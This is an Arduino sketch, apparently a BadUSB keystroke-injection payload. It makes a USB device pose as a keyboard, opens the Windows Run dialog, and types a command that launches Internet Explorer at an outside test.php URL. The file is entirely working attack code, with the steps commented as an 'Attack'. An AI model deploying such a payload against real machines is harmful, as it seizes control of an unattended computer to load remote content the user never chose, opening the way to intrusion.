#include "HID-Project.h"

void setup() {
  // Setup
  Keyboard.begin();
  delay(1000);

  // Attack
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');  
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("iexplore https://imsj.dev/tools/test.php");
  Keyboard.press(KEY_ENTER);
  Keyboard.releaseAll();
  delay(1000);

  // End
}

void loop() {

}
